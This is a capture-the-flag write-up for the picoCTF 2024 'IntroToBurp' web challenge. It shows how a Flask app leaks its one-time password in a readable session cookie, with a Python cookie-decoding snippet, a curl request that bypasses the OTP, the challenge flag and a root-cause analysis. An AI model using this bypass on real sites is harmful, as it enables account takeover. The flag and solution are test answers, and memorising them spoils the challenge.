# IntroToBurp

**Platform:** CyLab Security Academy (picoCTF), picoCTF 2024
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}`

## Summary

A Flask registration flow stores form data, including a server generated one time password, in
the client's session cookie. Flask's default session implementation only signs the cookie with
`itsdangerous`, it does not encrypt it, so anyone can decode and read the full session payload
without knowing the app's secret key. The OTP meant to gate access to the dashboard is sitting
in plaintext in that payload.

## Discovery

Registering an account redirects to `/dashboard`, which presents a one time password form
instead of the expected content. An unauthenticated `GET /dashboard` (no session at all) 302
redirects back to `/`, confirming the OTP screen is session gated rather than a separate check.

The session cookie set after registration looks like standard Flask session data:

```
Set-Cookie: session=.eJw9jEEOwiAQRa-irF0w0AHiHUxcuG8qHdJGWhqgGmO8u1Nj3M28l_9ewo_1KY7iRHVI_X2...an71gw.QzwMsPOBkotPvLe1N9uJsORwVmk; HttpOnly; Path=/
```

The leading `.` marks a zlib-compressed payload (Flask enables this once the session data
exceeds a size threshold). The cookie format is
`<base64(zlib(payload))>.<timestamp>.<signature>`. Signing prevents *tampering* but does nothing
to prevent *reading* the payload, since no encryption is applied.

## Proof of Concept

Decode the session cookie's middle segment:

```python
import base64, zlib

raw = "<the session cookie value>"
payload_b64 = raw.split(".")[1]
pad = "=" * (-len(payload_b64) % 4)
compressed = base64.urlsafe_b64decode(payload_b64 + pad)
print(zlib.decompress(compressed).decode())
```

```json
{"city":"Methodville","csrf_token":"...","full_name":"Method Test","otp":"671855",
 "password":"Passw0rd!","phone_number":"5551234567","username":"methodtest1"}
```

The `otp` field is the exact value the server expects back. Submitting it directly succeeds:

```
curl -s -b cookies.txt -X POST http://TARGET/dashboard -d "otp=671855"
```

```
Welcome, methodtest1 you sucessfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
```

## Root Cause

Sensitive, server side generated verification data (the OTP) was placed into client-controlled
state (the Flask session cookie) that is only integrity protected, not confidentiality
protected. Anyone intercepting or simply reading their own browser's cookie can recover a value
that was supposed to only ever be known to the legitimate account holder via a separate,
out of band delivery channel.

## CWE / OWASP

- **CWE-315**: Cleartext Storage of Sensitive Information in a Cookie
- **CWE-522**: Insufficiently Protected Credentials
- **OWASP A02:2021**: Cryptographic Failures
